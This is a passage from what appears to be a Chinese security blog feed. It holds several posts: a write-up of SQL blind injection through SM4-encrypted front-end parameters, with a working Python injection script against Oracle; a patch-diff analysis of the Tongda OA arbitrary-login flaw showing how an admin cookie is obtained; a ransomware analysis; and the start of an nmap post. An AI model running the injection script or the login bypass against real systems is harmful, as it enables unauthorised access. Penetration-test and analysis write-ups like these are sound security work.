src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/04-javasm4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.png" alt="04-javasm4加密解密"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> json</span><br><span class="line">   <span class="keyword">import</span> os</span><br><span class="line">   <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">   </span><br><span class="line">   header = &#123;</span><br><span class="line">       <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">   pay = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._!@#$%^&amp;*()&#x27;</span></span><br><span class="line">   </span><br><span class="line">   proxies = &#123;</span><br><span class="line">       <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">#request构造请求，传入data中的_searchWhere</span></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">payload</span>):</span></span><br><span class="line">       url = <span class="string">&quot;http://&quot;</span></span><br><span class="line">       data = <span class="string">&quot;&#123;\&quot;_searchWhere\&quot;:\&quot; %s\&quot;,\&quot;title\&quot;:\&quot;\&quot;,\&quot;paramsFlag\&quot;:\&quot;false\&quot;,\&quot;parVar\&quot;:\&quot;\&quot;,\&quot;frameId\&quot;:\&quot;=\&quot;,\&quot;readOnly\&quot;:\&quot;\&quot;,\&quot;extWhere\&quot;:\&quot;\,\&quot;type\&quot;:\&quot;\&quot;,\&quot;parWhere\&quot;:\&quot;\&quot;,\&quot;dataFlag\&quot;:\&quot;\&quot;&#125;&quot;</span> % payload</span><br><span class="line">       data = quote(data,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">       command = <span class="string">&quot;java -Dmoudle=e -Dstr=%s -jar sm4Decode.jar&quot;</span> % data</span><br><span class="line">       data_sm4 = <span class="string">&quot;&quot;</span>.join(os.popen(command).readlines())</span><br><span class="line">       data_send = &#123;<span class="string">&quot;md5_bean&quot;</span>:data_sm4&#125;</span><br><span class="line">       cookies = &#123;<span class="string">&quot;&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">       result = requests.post(url=url, data=data_send, cookies=cookies, headers=header ,proxies=proxies)</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">len</span>(result.text)</span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">       <span class="comment"># 判断数据库</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">           payload = <span class="string">&quot;and (select length(name) from v$database)=%s&quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">           <span class="built_in">print</span>(payload)</span><br><span class="line">           lenstr = attack(payload)</span><br><span class="line">           <span class="keyword">if</span> lenstr &gt; <span class="number">3000</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">&quot;数据库长度是%s&quot;</span>% <span class="built_in">str</span>(i))</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br></pre></td></tr></table></figure><p>4.此时客户疑问，这个sql注入1=1 1=2返回结果是不同、暴露一个数据库版本等信息又有什么用，于是多注了一点信息，证明危害，获取用户表名的过程比较啰嗦，这里只有是结果图。<br>a. 用户表数据<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/05-%E7%9B%B2%E6%B3%A8%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E8%A1%A8.png" alt="05-盲注获取用户表"></p><p>b. owner表数量</p><img src="/img/一次sm4前端参数加密下的sql盲注/06-盲注获取owner表数量.png" alt="06-盲注获取owner表数量" style="zoom:33%;" /><h3 id="0x03-第三次JS加密混淆隐藏密钥"><a href="#0x03-第三次JS加密混淆隐藏密钥" class="headerlink" title="0x03 第三次JS加密混淆隐藏密钥"></a>0x03 第三次JS加密混淆隐藏密钥</h3><ol><li><p>最后一次复测，用户表示已经没问题了，让再看一下，由于时间有点长，重新找一下加密算法位置</p><p>使用抓包抓到的URL，在chrome调试工具中search一下位置，打下断点，点击功能看一下是否触发断点。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/07-%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%8A%93%E5%8C%85.png" alt="07-第三次抓包"><br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/08-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0url%E8%AF%B7%E6%B1%82%E4%BD%8D%E7%BD%AE.png" alt="08-调试找到url请求位置"></p></li><li><p>接下来一步一步跟下去，找到参数构造md5_bean参数的位置<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/09-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0.png" alt="09-调试找到参数构造"></p></li><li><p>next找到base64.js，发现代码已经压缩而且加密了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p></li><li><p>遇到JS加密了如果有实力的大佬可以解密js或者 <a href="https://www.sojson.com/jsobfuscator.html">https://www.sojson.com/jsobfuscator.html</a> 付费解密，不过只是想得到密钥和iv的话，可以在断点进入base64.js后，调试窗口肯定会显示密钥和iv值，因为不管怎么混淆，代码还是要被正常执行的。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p></li><li><p>接下来又是注入了，之前用的脚本思路太麻烦了，这次简单点，直接调SM4加密的js，由于这段js已经混淆了，于是从网上找来base64.js的源码简单改了一下，使用python的execjs调用加密。</p></li></ol><p>a. java解开加密内容如图</p><p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/12-%E5%AF%B9%E6%AF%94%E6%98%8E%E6%96%87%E5%AF%86%E6%96%87.png" alt="12-对比明文密文"></p><p>b. python调用js加密明文内容，对比结果（调用js的代码如图，上面没有了，因此没有粘过来，感觉内容有点啰嗦了）<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/13-py%E8%B0%83%E7%94%A8js%E5%AE%9E%E7%8E%B0SM4.png" alt="13-py调用js实现SM4"></p><p>6.如此便不用java介入了，之后的操作就是利用之前的盲注脚本，修改一下data参数的加密获取就行了，重复的盲注过程。</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><ol><li>实际上现在得web框架中很少这种前端传js的了，但是在很多老企业中还是有部分网站不想重构，这样的例子有很多，第一次开发说出这种修复sql注入的方法时，还很犹豫的回答，还可以注入吧。。。，没想到真的有人这样修复，随着一次一次的治标不治本，自己也在不断探索学习。</li><li>有的时候感觉除非大厂，很多网站如果一抓包看到把参数一起加密了，很有可能是在想隐藏什么漏洞。。。</li><li>还有一个小坑，加密js在JavaScript中需要手动new一个对象，再用py调用对象+方法。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 加密解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意用户登录漏洞分析</title>
      <link href="/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        4月20日，阿里云漏洞预警，通达OA任意用户登录漏洞，链接如下：<a href="https://help.aliyun.com/noticelist/articleid/1060277736.html">https://help.aliyun.com/noticelist/articleid/1060277736.html</a> </p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><p>某盘下载的TDOA11.0.exe</p></li><li><p>文件对比工具（DiffMerge等）</p></li><li><p>zend解密小工具</p></li></ul><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre><code>    1. 直接安装TDOA11.0.exe，版本号为11.0.190911       2. 打开“通达应用服务控制中心”启动服务，测试web是否能正常访问      3. 使用OfficeAuto更新程序到11.4.200323 ，备份webroot文件夹      4. 更新到11.4.200417，拷贝webroot</code></pre><p><img src="http://yanxuan.nosdn.127.net/42334a5388839dd91f914689ad693d34.png" alt="1.png"></p><ol start="5"><li>原始的webroot中文件使用zend加密压缩，此处需要使用zend解密工具批量解密为正常的PHP文件</li></ol><p><img src="http://yanxuan.nosdn.127.net/43a30082b59108269b918fc3ee15d664.png" alt="2.png"> </p><h3 id="补丁对比"><a href="#补丁对比" class="headerlink" title="补丁对比"></a>补丁对比</h3><ol><li>对比更新前后的webroot文件</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/3.png" alt="3.png"> </p><ol start="2"><li>如图更新对$UID进行初始化，并判断是否为0</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/4.png" alt="4.png"> </p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/5.png" alt="5.png"> </p><p>由此可见UID是个关键参数，筛选文件对比结果，很清晰判断出更新补丁中哪些文件有相关逻辑。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>​    重点对更新文件进行分析，使用编辑器导入web项目，分析版本11.4的代码逻辑。</p><h5 id="一、Logincheck-code"><a href="#一、Logincheck-code" class="headerlink" title="一、Logincheck_code"></a>一、Logincheck_code</h5><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/6.png" alt="6.png"> </p><p>$UID有POST请求参数获取，访问该URL共需两个参数：UID &amp; CODEUID；</p><p>继续向下分析，中间的判断过程，仅对用户登陆安全登陆限制进行了判断，在如下位置后，直接存入对应UID的SESSION。</p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/7.png" alt="7.png"> </p><h5 id="二、跟踪判断如何构造CODEUID参数"><a href="#二、跟踪判断如何构造CODEUID参数" class="headerlink" title="二、跟踪判断如何构造CODEUID参数"></a>二、跟踪判断如何构造CODEUID参数</h5><p>​    更新文件中，login_code去掉了一些方法，从内容看出如果login_codeuid为空，访问该php时，会有getUniqid()返回CODEUID。</p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/8.png" alt="8.png"> </p><h5 id="三、构造Logincheck-code访问，获取登陆cookie"><a href="#三、构造Logincheck-code访问，获取登陆cookie" class="headerlink" title="三、构造Logincheck_code访问，获取登陆cookie"></a>三、构造Logincheck_code访问，获取登陆cookie</h5><ol><li>获取code_uid</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/9.png" alt="9.png"> </p><ol start="2"><li>构造POST请求，获取cookie，默认情况下，UID=1是admin账号，为系统管理员。</li></ol><p> <img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/10.png" alt="10.png"></p><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/11.png" alt="11.png"> </p><ol start="3"><li>使用Cookie访问系统</li></ol><p><img src="/img/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90/12.png" alt="12.png"> </p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li><p>未更新补丁前，备份logincheck_code.php，将该文件移除webroot目录；或使用WAF等安全产品，禁止logincheck_code.php访问</p></li><li><p>更新官方补丁</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>需要验证历史版本的从11.0更新时，可以逐步版本更新，备份webroot文件夹，验证对应版本是，更换webroot即可</p></li><li><p>第一次尝试对比补丁去验证漏洞，对于更新点比较少的应用，可以很快定位</p></li><li><p>登陆验证类功能点，只做状态判断，尽量不要附带其他功能</p></li></ol><p>Ps: 文章审核了快3个月。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码分析 </tag>
            
            <tag> 漏洞预警 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次分析勒索病毒</title>
      <link href="/2019/05/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
      <url>/2019/05/13/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<h5 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h5><p>​        接到客户通知，有个PC中了勒索病毒，领导让尽量分析一下给客户个回复，着急的我赶紧翻书翻教程，一顿qwer，最终还是没能将文件恢复，但是分析过程中又学习了一些知识，借此分享。</p><p>先附下加密后的截图</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%B8%AD%E7%97%85%E6%AF%92%E5%90%8E.png" alt="中病毒后"></p><h3 id="0x02-样本信息"><a href="#0x02-样本信息" class="headerlink" title="0x02 样本信息"></a>0x02 样本信息</h3><ul><li><p>程序名： 7407.tmp.exe</p></li><li><p>样本大小：445952</p></li><li><p>MD5：b65014814bbbd09367df4a86c0d4204d</p></li><li><p>加壳混淆：UPX 0.89 - 3.x</p></li><li><p>在线检测</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%9C%A8%E7%BA%BFAV%E6%A3%80%E6%B5%8B.png" alt="在线AV检测"></p></li><li><p>分析工具：OD、X32dbg、IDA、火绒剑、微步在线</p></li></ul><h3 id="0x03-监控运行分析程序行为"><a href="#0x03-监控运行分析程序行为" class="headerlink" title="0x03 监控运行分析程序行为"></a>0x03 监控运行分析程序行为</h3><ol><li>自身复制</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%87%AA%E8%BA%AB%E5%88%9B%E5%BB%BA.png" alt="自身创建"></p><ol><li>修改注册表</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8.png" alt="修改注册表"></p><ol><li>监控单个文件的操作流程</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E6%B5%81%E7%A8%8B.png" alt="一个文件的流程"></p><ol><li>netstat监控无网络行为</li><li>import导入函数中无加密函数，怀疑没有使用公用的加密算法进行加密</li></ol><h3 id="0x04-脱壳后OD分析-进入误区"><a href="#0x04-脱壳后OD分析-进入误区" class="headerlink" title="0x04 脱壳后OD分析-进入误区"></a>0x04 脱壳后OD分析-进入误区</h3><ol><li>由于是UPX加壳，直接用脱壳工具就掉了</li><li>GetTempFileNameA获取tmp目录</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/GetTempFileNameA.png" alt="GetTempFileNameA"></p><ol><li>getTempFile</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/getFileTempName.png" alt="getFileTempName"></p><ol><li>打印机的相关操作（不知道有什么用，反正是进入误区了）</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E6%89%93%E5%8D%B0%E6%9C%BA%E5%90%8D%E7%A7%B0.png" alt="设置默认打印机名称"></p><p> 到此，程序运行退出，文件也没加密，这就肯定有反调试了，但是OD有插件啊，怀疑程序对INT 3断点有反调检测，直接把所有断线都取消了重新设置一下：<strong>进入call后，在第二行下断点</strong></p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/INT3%E6%A3%80%E6%B5%8B.png" alt="INT3检测"></p><p> 此时发现程序还是会自动退出，同时文件也开始被加密了，查看进程列表和火绒剑，发现又多了一个7407.tmp.exe进程，调用位置也和调试的病毒程序一样。于是重新在 <strong>CreateProcessW</strong>下断点，刚开始病毒程序有其他反调检测，程序发现被调试时会重新起一个进程，后来通过火绒剑发现无调试时也有创建进程操作；</p><p> 接着尝试在 <strong>WriteMemory</strong>下断点，这下找到了真实的病毒执行体</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/WriteProcess%E5%86%99%E8%BF%9B%E7%A8%8B.png" alt="WriteProcess写进程"></p><ol><li>dump真实病毒程序 PE头文件，找到OEP</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E7%9C%9F%E5%AE%9E%E7%97%85%E6%AF%92OEP.png" alt="真实病毒OEP"></p><p> 下一步在主程序使用ResumeThread恢复新进程前，使用X32DBG附加新进程；可以在ResumeThread处下断点，再附加新进程。</p><h3 id="0x05-X32dbg分析-真实病毒文件"><a href="#0x05-X32dbg分析-真实病毒文件" class="headerlink" title="0x05 X32dbg分析-真实病毒文件"></a>0x05 X32dbg分析-真实病毒文件</h3><ol><li>删除卷影副本</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.png" alt="执行命令"></p><ol><li><p>在 WriteFile、CreateFileW、ReadFile、DeleteFileW、GetWindowsDirectoryA处下断点，运行程序，断下来后，回溯进入程序领空</p><p>此时找到sub_402880为病毒进程加密一个的整个操作</p></li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E4%B8%BB%E8%A6%81CALL.png" alt="勒索病毒主要CALL"></p><ol><li>往下翻，找到主要的加密（计算）依据 （key） sub_4034C0</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E4%BE%9D%E6%8D%AEkey.png" alt="加密依据key"></p><ol><li>找到加密CALL，这里确定是加密CALL的原因是，执行这个CALL后，发现之前读取到文件内容的Buffer区域中，被写入了新的数据，且该数据和文件被加密后的16进制内容相同。</li></ol><p>a. 读取到的文件内容</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%95%B0%E6%8D%AE.png" alt="读取文件的数据"></p><p>b. 执行了sub_403960后数据变化</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E5%90%8E.png" alt="加密后">c. WinHex查看加密后文件</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/tass_liehuHEX%E6%9F%A5%E7%9C%8B.png" alt="tass_liehuHEX查看"></p><ol><li>根据sub_403960执行前压栈信息，发现有一个重要的计算依据，可以叫做加密key，由 第三步sub_4034C0得到</li></ol><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8F%82%E6%95%B0.png" alt="参数"></p><ol><li>尝试分析加密参数生成、文件内容加密的计算方法 – 没成功，有些复杂</li></ol><p>a. key 值计算CALL内部</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/key%E5%80%BC%E8%AE%A1%E7%AE%97.png" alt="key值计算"></p><p>对比IDA Pro</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/IDA-key%E8%AE%A1%E7%AE%97call.png" alt="IDA-key计算call"></p><p>b. 加密CALL内部</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86CALL%E5%86%85%E9%83%A8.png" alt="加密CALL内部"></p><p>对比IDA Pro</p><p><img src="/img/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.png" alt="加密文件内容"></p><p> 到此，发现key值也有一个动态的计算依据，这个需要重新回溯，而且计算过程比较麻烦，所以结束了。</p><h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><ol><li><p>写注册表操作</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\7407.tmp.exe</p></li><li><p>自身复制</p><p>C:\Windows\System32\7407.tmp.exe<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\7407.tmp.exe<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\7407.tmp.exe</p></li><li><p>病毒不会蠕虫传播、无明显的网络行为</p></li><li><p>没有加密操作，只是自定义了一些函数，对文件内容读取、运算，写入新文件，删除源文件</p></li><li><p>目前测试火绒杀毒不能识别病毒文件</p></li></ol><p> 分析到这，通知用户在中毒机器上 杀掉所有 7407.tmp.exe进程，删除对应注册表、自身复制的文件，使用磁盘恢复工具尝试一下能不能恢复文件。</p><h3 id="0x07-分析过程中的一些小知识点"><a href="#0x07-分析过程中的一些小知识点" class="headerlink" title="0x07 分析过程中的一些小知识点"></a>0x07 分析过程中的一些小知识点</h3><ol><li>调试时发现反调插件已经有了，还是一调试就退出，先尝试把异常忽略关闭，看看是否可行；同时考虑程序检测导入函数是否被下断点（原因是OD在设置CC断点时，会将对应位置的机器码修改为 CC01，反调试程序会检测这个位置），这时可以尝试在CALL内第二行设置断点</li><li>对于自身启动新进程，通过内存将真实文件内容写入的方式，可以通过火绒剑一步一步监控，再找对应的API函数，下断点调试</li><li>OD中找到一个函数，想要在IDA中找到对应位置，因为IDA有伪代码，一般情况，直接跳转地址，发现找不到，此时，使用 函数地址 - OD中基址 + IDA基址 ，再使用G跳转，也可以找到特征字符，在IDA中使用 alt + b搜索位置</li></ol>]]></content>
      
      
      <categories>
          
          <category> 勒索病毒 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒分析 </tag>
            
            <tag> 逆向学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap结果过滤脚本</title>
      <link href="/2018/05/13/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/"/>
      <url>/2018/05/13/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一个简单的python脚本，将nmap输出的xml格式提取为excel</p></blockquote><h3 id="一、Nmap扫描"><a href="#一、Nmap扫描" class="headerlink" title="一、Nmap扫描"></a>一、Nmap扫描</h3><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/1.png" alt="精准打击"></p><p>  在信息收集阶段，一个重要的环节就是端口扫描，如果是一两个目标直接干就完了；但是如果是一堆IP地址段怎么办，这时扫描结果呼啦一大片，随便挑几个深入，这样显得不够专业吧</p><hr><p><strong>nmap的几个命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -sS 192.168.1.1 -T4 --open -n</span><br><span class="line">2. nmap -sV 192.168.1.1 -T4 --open -p 22,80,3389 -n -O</span><br></pre></td></tr></table></figure><blockquote><p>注明：nmap的参数有很多，不列举了，sS 使用SYN的快速扫描（速度快），sV 探测端口服务，-O 探测目标操作系统</p></blockquote><h3 id="二、结果输出"><a href="#二、结果输出" class="headerlink" title="二、结果输出"></a>二、结果输出</h3><p>  添加-oX参数指定输出为xml格式</p><figure class="highlight plain"><table><tr><td 